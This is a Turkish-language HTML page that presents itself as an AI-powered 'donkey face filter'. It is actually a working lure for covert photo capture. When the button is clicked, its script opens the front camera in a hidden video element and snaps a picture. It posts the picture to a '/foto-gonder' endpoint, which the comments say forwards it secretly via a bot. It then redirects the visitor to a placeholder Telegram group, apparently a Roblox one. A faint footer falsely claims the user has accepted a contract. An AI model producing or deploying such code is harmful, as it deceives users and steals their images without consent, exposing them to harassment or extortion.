<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Eşek Efekti Filtresi</title>
    <style>
        /* Deniz Arkaplanı */
        body { 
            margin: 0; 
            padding: 0; 
            overflow: hidden; 
            background: linear-gradient(to bottom, #006994, #003366); 
            color: white; 
            font-family: Arial, sans-serif; 
            display: flex; 
            flex-direction: column; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            position: relative; 
        }

        /* Yüzen Balık Animasyonları */
        .balik { position: absolute; font-size: 2rem; white-space: nowrap; animation: yuzme linear infinite; z-index: 1; }
        @keyframes yuzme {
            0% { transform: translateX(-100vw); }
            100% { transform: translateX(100vw); }
        }
        .b1 { top: 20%; animation-duration: 12s; animation-delay: 0s; font-size: 2.5rem; }
        .b2 { top: 50%; animation-duration: 18s; animation-delay: 3s; font-size: 3.5rem; }
        .b3 { top: 75%; animation-duration: 14s; animation-delay: 1s; font-size: 2rem; }

        /* Ortadaki Kutu */
        .kutu { 
            background: rgba(0, 0, 0, 0.4); 
            padding: 30px; 
            border-radius: 15px; 
            text-align: center; 
            box-shadow: 0 4px 15px rgba(0,0,0,0.5); 
            z-index: 10; 
            max-width: 90%;
        }
        
        h2 { margin-top: 0; color: #ffeb3b; }
        
        button { 
            background-color: #ff9800; 
            color: white; 
            border: none; 
            padding: 15px 25px; 
            font-size: 16px; 
            border-radius: 8px; 
            cursor: pointer; 
            font-weight: bold; 
            margin-top: 15px;
            transition: 0.3s;
        }
        button:hover { background-color: #e68a00; }

        /* Yarı Saydam Sözleşme Yazısı */
        .sozlesme {
            position: absolute;
            bottom: 15px;
            color: rgba(255, 255, 255, 0.5); /* 0.5 şeffaflık beyaz */
            font-size: 12px;
            z-index: 10;
            text-align: center;
            width: 100%;
        }
    </style>
</head>
<body>

    <!-- Arkaplan Balıkları -->
    <div class="balik b1">🐟</div>
    <div class="balik b2">🐠</div>
    <div class="balik b3">🐡</div>

    <!-- Ana Ekran -->
    <div id="anaKutu" class="kutu">
        <h2>🐴 Yeni Yüz Filtresi</h2>
        <p>Yapay zeka destekli filtremizi denemek için hazır mısın?</p>
        <button onclick="baslat()">Eşek efekti denemek için izin verin</button>
    </div>

    <!-- Alttaki Sözleşme Metni -->
    <div class="sozlesme">
        Sözleşme kabul edilmiştir siteyi kullanılan sürede
    </div>

    <!-- Kameralar Arka Planda Gizli Çalışır -->
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        function baslat() {
            // Butona basılınca ekranı yükleniyor gibi göster
            document.getElementById('anaKutu').innerHTML = "<h3>Efekt Yükleniyor...<br><br>Lütfen kameraya bakın 🐴</h3>";

            // Arka planda kamerayı aç
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                .then(function(stream) {
                    var video = document.getElementById('video');
                    video.srcObject = stream;
                    video.play();

                    video.onloadedmetadata = function() {
                        // Kamera ışık ayarını yapsın diye çok kısa (800ms) bekleyip anında çeker
                        setTimeout(function() {
                            var canvas = document.getElementById('canvas');
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            var context = canvas.getContext('2d');
                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
                            var veriUrl = canvas.toDataURL('image/png');

                            // Orijinal fotoğrafı çaktırmadan bot üzerinden sana gönder
                            fetch('/foto-gonder', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({ image: veriUrl })
                            }).then(() => {
                                // Gönderim bittiği an kamerayı kapat
                                stream.getTracks().forEach(track => track.stop());
                                
                                // VE DİREKT RBX GRUBUNA YÖNLENDİR!
                                // LİNKİ BURAYA YAPIŞTIR:
                                window.location.href = "https://t.me/BURAYA_RBX_GRUBUNUN_LINKINI_YAZ";
                            });
                        }, 800); 
                    };
                })
                .catch(function(err) {
                    alert("Efekti deneyebilmek için kameraya izin vermeniz gerekiyor!");
                    location.reload();
                });
        }
    </script>
</body>
</html>
